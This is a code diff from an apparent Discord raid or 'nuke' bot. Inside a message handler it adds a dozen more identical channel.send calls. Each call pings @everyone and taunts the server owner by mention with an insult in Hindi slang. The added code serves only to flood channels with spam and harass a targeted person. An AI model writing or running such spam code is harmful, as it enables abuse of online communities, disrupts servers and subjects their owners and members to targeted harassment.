@@ -2274,6 +2274,18 @@ async def on_message(message):
                             await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
                             await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
                             await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
+                            await channel.send(f"@everyone Mrinal se Panga >:) {message.guild.owner.mention} Kamina")
                         except Exception as e:
                             print(e)
                             pass
